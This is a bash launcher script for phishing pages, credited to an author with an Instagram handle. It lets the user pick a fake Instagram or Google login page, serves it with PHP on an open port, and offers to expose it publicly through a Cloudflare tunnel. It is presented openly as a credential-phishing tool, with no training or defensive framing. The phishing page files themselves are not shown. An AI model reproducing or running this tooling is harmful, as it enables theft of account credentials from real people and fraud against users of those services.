#!/bin/bash

clear
echo -e "\e[1;31m=============================================\e[0m"
echo -e "\e[1;33m    🎭\e[1;32m   PHISHING SERVER LAUNCHER   \e[1;33m🎭\e[0m"
echo -e "\e[1;35m        Created by \e[1;34mSantosh Ahir\e[0m"
echo -e "\e[1;36m    Instagram : \e[1;37m@just_smile.28\e[0m"
echo -e "\e[1;31m=============================================\e[0m"
echo "1️⃣ Instagram Phishing"
echo "2️⃣ Google Phishing"
echo "==============================="
read -p "Choose an option (1/2): " choice

if [[ "$choice" == "1" ]]; then
    folder="instagram"
    site="Instagram"
elif [[ "$choice" == "2" ]]; then
    folder="google"
    site="Google"
else
    echo "❌ Invalid choice! Exiting..."
    exit 1
fi

read -p "Enter port number (Default: 8080): " port
port=${port:-8080}  # Default port 8080 if blank

# Start PHP server
echo "🚀 Starting $site Phishing Server on port $port..."
php -S 0.0.0.0:$port -t $folder > /dev/null 2>&1 &

sleep 2
echo "✅ $site Phishing Page is Live!"
echo "🌐 Access it locally: http://localhost:$port"

# Ask if user wants a public link
read -p "🔗 Do you want a public link? (y/n): " public_link

if [[ "$public_link" == "y" ]]; then
    echo "🌍 Creating a public link with Cloudflare..."
    cloudflared tunnel --url http://localhost:$port > link.txt 2>&1 &
    sleep 5
    tail -n 2 link.txt | grep -o 'https://.*'
fi

echo "📌 Press CTRL+C to stop the server."
wait

